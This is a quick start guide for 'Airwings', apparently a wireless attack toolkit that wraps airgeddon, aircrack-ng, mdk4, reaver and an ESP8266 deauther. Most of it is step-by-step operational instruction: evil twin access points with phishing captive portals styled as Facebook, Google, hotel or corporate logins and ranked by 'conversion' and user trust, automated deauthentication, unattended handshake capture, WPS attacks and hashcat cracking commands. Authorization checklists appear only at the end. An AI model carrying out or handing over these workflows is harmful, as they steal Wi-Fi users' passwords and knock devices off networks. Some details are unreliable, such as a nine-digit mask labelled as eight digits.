# Airwings - Quick Start Guide

## 🚀 Get Started in 5 Minutes

### 1. Install Dependencies
```bash
# Install core tools
sudo apt update && sudo apt install -y git python3 python3-pip aircrack-ng bettercap mdk4 reaver bully

# Install Python packages
pip3 install scapy requests esptool huhnitor

# Install hashcat for GPU cracking (optional but recommended)
sudo apt install -y hashcat
```

### 2. Make Airwings Executable
```bash
cd /home/blxckmoon/Desktop/toolkit/airwings
chmod +x bin/airwings.sh
sudo ln -s $(pwd)/bin/airwings.sh /usr/local/bin/airwings
```

### 3. Launch Airwings
```bash
sudo airwings
```

### 4. First Attack (Basic Evil Twin)
```
Main Menu → [1] Interface Management → [1] List Wireless Interfaces
→ [2] Select Interface → Choose your WiFi adapter
→ [3] Enable Monitor Mode

Main Menu → [5] Captive Portal Attacks → [1] Quick Evil Twin
→ Enter target BSSID (scan first with option [2])
→ Choose portal template (Facebook, Google, Hotel, etc.)
> **Tip:** by default the server will auto-detect iOS vs Android clients and serve the
> corresponding portal. You only need to pick a template if you want to force a particular
> design or use one of the legacy templates.
→ Launch attack
```

### 5. Monitor Results
- Watch the airgeddon windows
- Captured passwords appear in the control panel
- Results are saved to `logs/credentials/`

## 🎯 Essential Commands

### airgeddon Integration
```bash
# Full airgeddon with all features
Main Menu → [3] Airgeddon Integration → [1] Launch airgeddon

# Quick Evil Twin
Main Menu → [3] → [2] Quick Evil Twin

# WPS Attacks
Main Menu → [3] → [3] WPS Attacks
```

### ESP8266 Hardware
```bash
# Flash ESP8266
Main Menu → [4] ESP8266 Deauther → [1] Flash Firmware
→ Select device → Choose firmware → Confirm flash

# Access web interface
Main Menu → [4] → [3] Web Interface
→ Connect to "pwned" WiFi (password: deauther)
→ Browse to http://192.168.4.1
```

### Network Scanning
```bash
# Quick scan (30 seconds)
Main Menu → [2] Network Scanning → [1] Quick Scan

# Detailed scan
Main Menu → [2] → [2] Detailed Scan

# WPS networks only
Main Menu → [2] → [4] WPS Networks
```

### Password Cracking
```bash
# Capture handshake first
Main Menu → [3] → [4] Handshake Capture
→ Select target → Deauth → Verify capture

# Crack with hashcat (GPU)
Main Menu → [6] Handshake & Password → [1] Capture & Crack
→ Use rockyou.txt → Start cracking
```

## 🎨 Popular Captive Portal Templates

### Facebook WiFi (Highest Conversion)
```
Main Menu → [5] → [3] Portal Templates → [1] Facebook WiFi
• Modern Facebook branding
• High user trust
• Mobile responsive
• Single password field
```

### Hotel Portal (Hospitality)
```
Main Menu → [5] → [3] → [3] Hotel Portal
• Room number field
• Guest name field
• Professional appearance
• High compliance in hotels
```

### Google WiFi (Corporate)
```
Main Menu → [5] → [3] → [2] Google WiFi
• Material Design
• Clean interface
• High professional trust
• Minimal distraction
```

## 📡 ESP8266 Quick Workflow

### Flashing the Device
```bash
1. Connect ESP8266 to USB
2. Airwings → [4] → [1] Flash Firmware
3. Select device from list
4. Choose option [1] Download latest
5. Hold FLASH button, press RESET, release FLASH
6. Wait for "Firmware flashed successfully"
```

### Hardware Attack Setup
```bash
1. Access web interface: http://192.168.4.1
2. Scan for targets (Scan tab)
3. Select attack (Attack tab):
   • Deauth: Disconnect devices
   • Beacon: Create fake APs
   • Probe: Device discovery
4. Monitor results in real-time
```

### Serial Control with Huhnitor
```bash
# Alternative to web interface
Airwings → [4] → [2] Serial Monitor
→ Commands: help, scan, deauth, beacon, monitor
```

## 🔐 Password Cracking Examples

### Dictionary Attack (Fast)
```bash
# After capture, crack with rockyou
hashcat -m 22000 handshake.hc22000 rockyou.txt
```

### Brute Force 8-digit PIN
```bash
# For WPS or PIN-based systems
hashcat -m 22000 handshake.hc22000 -a 3 ?d?d?d?d?d?d?d?d?d
```

### Mask Attack for Known Pattern
```bash
# Password starts with "password" + 3 digits
hashcat -m 22000 handshake.hc22000 -a 3 password?d?d?d
```

## ⚡ One-Click Workflows

### Standard Evil Twin Attack
```
Main Menu → [5] → [1] Quick Evil Twin
→ Scan for targets → Select network
→ Choose Facebook template → Start attack
→ Monitor credentials → Stop when done
```

### Automated Handshake Collection
```
Main Menu → [3] → [4] Handshake Capture
→ Enable continuous mode
→ Set deauth interval (30 seconds)
→ Leave running unattended
→ Check results later
```

### Multi-Network WPS Testing
```
Main Menu → [7] → [3] WPS Attacks
→ [1] Scan for WPS networks
→ [2] Pixie Dust attack on all
→ Monitor for successful cracks
```

## 🎯 Target-Specific Attacks

### Corporate Environment
```
Main Menu → [5] → [4] Targeted Attack → [1] Corporate
• Uses company branding
• Includes "IT Department" fields
• Professional email domain format
• High corporate trust factor
```

### Hotel/Guest Network
```
Main Menu → [5] → [4] → [7] Residential Complex
• Room number authentication
• Guest name fields
• WiFi code instead of password
• Hospitality industry compliance
```

### Coffee Shop/Public WiFi
```
Main Menu → [5] → [4] → [2] Educational Institution
• Social login options
• Minimal friction
• High public acceptance
• Mobile-optimized design
```

## 📊 Monitoring & Analytics

### Real-time Monitoring
```
Main Menu → [8] → [7] Analytics & Tracking
→ [1] View captured credentials
→ [2] Device fingerprinting
→ [3] Connection statistics
→ [4] Real-time monitoring
```

### Export Attack Data
```
Main Menu → [8] → [6] Analytics & Tracking → [6] Export data
→ Choose format: CSV, JSON, HTML
→ Select data: credentials, devices, statistics
→ Export to reports directory
```

## 🛠️ Configuration

### Set Default Interface
```bash
Main Menu → [10] Configuration → [1] Default Interface
→ Select your preferred WiFi adapter
→ Save for future sessions
```

### ESP8266 Settings
```bash
Main Menu → [10] → [3] ESP8266 Configuration
→ Set default port (/dev/ttyUSB0)
→ Configure baud rate (115200)
→ Test connection
→ Save settings
```

### Attack Parameters
```bash
Main Menu → [10] → [4] Attack Settings
→ Deauth packet count (20-100)
→ Handshake timeout (30-120)
→ DoS interval (10-60)
→ Save default parameters
```

## 🐛 Common Issues & Solutions

### "No interfaces found"
```bash
Solution: Interface Management → [1] List Interfaces
• Check USB connections
• Install proper drivers
• Try different USB port
• Use lsusb to verify device detection
```

### "Monitor mode failed"
```bash
Solution: Interface Management → [3] Enable Monitor Mode
• Kill interfering processes: airmon-ng check kill
• Check VIF support: iw list | grep "AP/VLAN"
• Try different adapter if no VIF support
```

### "Evil Twin AP not starting"
```bash
Solution: Check VIF capability
• Only Atheros/Ralink chipsets support VIF
• Realtek (RTL) adapters won't work for Evil Twin
• Use Hardware Guide for adapter recommendations
```

### "Handshake not captured"
```bash
Solution: Increase deauth efforts
• Target specific client instead of broadcast
• Move closer to target
• Try different deauth method (mdk4 vs aireplay)
• Check if target uses 802.11w protection
```

### "Hashcat not using GPU"
```bash
Solution: Install proper drivers
• NVIDIA: sudo apt install nvidia-driver-470
• AMD: sudo apt install amdgpu-pro
• Verify: hashcat -I (should show GPU)
```

### "ESP8266 not responding"
```bash
Solution: Check serial connection
• Verify USB drivers (CH340, CP2102)
• Check device permissions: sudo chmod 666 /dev/ttyUSB0
• Try different port or USB cable
```

## 🔒 Safety Checklist

Before any attack, ensure:

- [ ] **Written authorization** from network owner
- [ ] **Defined scope** and time windows
- [ ] **Interface compatibility** (VIF support for Evil Twin)
- [ ] **Backup configurations** before changes
- [ ] **Legal compliance** verified for jurisdiction
- [ ] **Emergency procedures** in place

During attacks:

- [ ] **Monitor for unintended effects** on non-target systems
- [ ] **Stop immediately** if unauthorized systems affected
- [ ] **Document all activities** with timestamps
- [ ] **Respect time limitations** and scope boundaries
- [ ] **Protect privacy** of any captured data

After testing:

- [ ] **Restore original configurations**
- [ ] **Secure captured data** (encrypt, limited access)
- [ ] **Generate detailed report** with findings
- [ ] **Disclose vulnerabilities** responsibly
- [ ] **Clean up temporary files** and logs

## 🚨 Emergency Stop

To immediately stop all attacks:
```bash
# Press Ctrl+C in airwings main window
# Or run emergency cleanup:
sudo pkill -f airgeddon; sudo pkill -f airodump-ng; sudo pkill -f aireplay-ng
```

## 📞 Getting Help

### Built-in Help
```bash
airwings --help
airwings --version
airwings --check-deps
```

### Debug Mode
```bash
airwings --debug          # Enable debug logging
airwings --verbose        # Verbose output
airwings --check-config   # Verify configuration
```

### Common Commands Reference
```bash
# Scan networks quickly
sudo airomon-ng start wlan0; sudo airodump-ng wlan0mon

# Capture handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth all clients
sudo aireplay-ng --deauth 20 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack with hashcat
hashcat -m 22000 capture.hc22000 rockyou.txt

# Flash ESP8266
esptool.py --port /dev/ttyUSB0 write_flash 0x0 deauther.bin
```

---

**⚠️ FINAL WARNING:** Only test networks you own or have explicit permission to test. Unauthorized use is illegal and unethical.

**🎯 READY TO START:** Run `sudo airwings` and begin authorized security testing!